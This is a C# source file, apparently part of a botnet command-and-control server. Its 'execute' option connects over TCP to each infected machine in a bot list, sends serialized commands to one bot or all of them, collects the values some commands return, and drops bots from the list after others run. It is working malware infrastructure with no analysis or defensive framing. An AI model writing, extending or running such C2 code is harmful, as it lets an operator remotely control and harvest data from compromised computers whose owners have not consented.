using Common.Attributes;
using Common.Commands;
using Common.Commands.Collector_Commands;
using Common.Commands.Executer_Commands;
using Server.CnC_Server;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Runtime.Serialization.Formatters.Binary;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace CnC_Server.Options
{
    [OptionName("execute")]
    public class Execute_Option : Option
    {
        private Dictionary<string, Command> Commands;
        private List<Infected_Machine> Bots;
        private List<Task> ExecutionThreadPool;

        private string CommandName;
        private int BotID;

        /* Initiate the plugins map and bots map */
        public Execute_Option(Dictionary<string, Command> commands, List<Infected_Machine> bots)
        {
            this.Commands = commands;
            this.Bots = bots;
            this.ExecutionThreadPool = new List<Task>();
        }

        public bool ParseArguments(string[] arguments)
        {
            if (arguments.Length == 1 && Commands.ContainsKey(arguments[0]))
            {
                SetCommandName(arguments[0]);
                SetBotID(-1);
                return true;
            }
            else if(arguments.Length == 2 &&
                Commands.ContainsKey(arguments[0]) &&
                int.Parse(arguments[1]) <= Bots.Count &&
                int.Parse(arguments[1]) > 0)
            {
                SetCommandName(arguments[0]);
                SetBotID(int.Parse(arguments[1]) - 1);
                return true;
            }

            return false;
        }

        public void PrintDescription()
        {
            Console.WriteLine("This option will execute the requested command on all bots or on specific bot and will save the data for further analysis. FORMAT: execute <name of command> <bot id> (no bot id given = all bots)\n");
        }

        public void Run()
        {
            if (BotID == -1)
            {
                for (int i = 0; i < Bots.Count; i++)
                {
                    ExecutionThreadPool.Add(Task.Factory.StartNew(SendSingleBot, i));
                }
            }
            else
            {
                ExecutionThreadPool.Add(Task.Factory.StartNew(SendSingleBot, BotID));
            }

            Task.WaitAll(ExecutionThreadPool.ToArray());

            if (Commands[CommandName] is Executer)
            {
                RemoveAfterExecution();
            }
        }

        private void SetCommandName(string commandName)
        {
            this.CommandName = commandName;
        }

        private void SetBotID(int botID)
        {
            this.BotID = botID;
        }

        private void SendSingleBot(object botID)
        {
            try
            {
                // Connect to the request bot
                TcpClient tcpClient = new TcpClient(Bots[(int)botID].ip, Bots[(int)botID].port);

                MemoryStream fs = new MemoryStream();
                BinaryFormatter formatter = new BinaryFormatter();
                formatter.Serialize(fs, Commands[CommandName]);
                byte[] buffer = fs.ToArray();
                tcpClient.GetStream().Write(buffer, 0, buffer.Length);

                if (Commands[CommandName] is Collector) 
                {
                    byte[] response = new byte[2048];
                    
                    tcpClient.GetStream().Read(response, 0, response.Length); // Get the result of the command execution from the bot

                    // Update the locally saved data to the result received from the command
                    if (!Bots[(int)botID].SetNewValue(CommandName, BitConverter.ToDouble(response,0)))
                    {
                        Console.WriteLine("Error setting the new value returned!");
                    }
                }

                tcpClient.Close();
            }
            catch (Exception)
            {
                throw;
            }
        }

        private void RemoveAfterExecution()
        {
            if (BotID == -1)
            {
                Bots.Clear();
            }
            else
            {
                Bots.RemoveAt(BotID);
            }
        }
    }
}
